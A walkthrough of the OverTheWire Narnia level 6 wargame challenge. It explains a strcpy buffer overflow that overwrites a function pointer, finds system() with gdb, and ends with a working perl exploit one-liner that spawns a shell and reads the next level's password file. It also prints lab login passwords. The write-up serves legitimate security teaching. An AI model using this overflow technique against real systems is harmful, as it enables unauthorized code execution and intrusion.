# Level 6 -> Level 7
ssh narnia6@narnia.labs.overthewire.org -p 2226  
Pass: BAV0SUV0iM  
An initial run of the binary shows the following:  
<img width="402" alt="Screen Shot 2024-04-01 at 9 42 05 AM" src="https://github.com/tylerdionne/OverTheWire-Narnia-Write-ups/assets/143131384/ce76ea56-ec51-4843-96c9-5f249d448936">

Looking at the C source file we see several important pieces. 
The first important piece we see is the assembly instructions. We see that these instructions are in At&t syntax which is in the form operation source, dest.  
Note that for At&t syntax % is used for registers and $ is used for immediate values.
We see that these instructions inside of the get_sp method mov a long "movl" from esp to eax and then performs an "and" operation on eax with the value 0xff000000.  

The second key piece of information is that we see the use strcpy which is a known dangerous C function because it does not perform boundary checking so it is vulenrable to buffer overflows. We see that we provide two command line arguments which are copied into two arrays of size 8. 

We see the line:
int  (*fp)(char *)=(int(*)(char *))&puts, i;
This creates a function pointer "fp" which points at the puts() function.
So after this whatever is passed to "fp" will be printed to the console via puts().

If we can get fp to point at something like "system" and then pass a /bin/sh to it we can get a shell.  
So we want to grab the memory address of the system function in the libc library of the binary which we can do using gdb.  
$ gdb ./narnia6  
(gdb) break main   
(gdb) r  
(gdb) p system   
This sequence of commands gives us the following line of output:  
$1 = {int (const char *)} 0xf7c48170 <__libc_system>  
So now we now that 0xf7c48170 is the address that points to system() in the libc library.

So fill b1 with 8 A's then overwrite the address poitned to by fp.  
Then fill b2 with 8 B's then overwrite the junk stored in b1 with the command we want to execute.  

$ ./narnia6 $(perl -e 'print "AAAAAAAA\x70\x81\xc4\xf7\ BBBBBBBB/bin/sh"')  
$ cat /etc/narnia_pass/narnia7  
Pass: YY4F9UaB60  
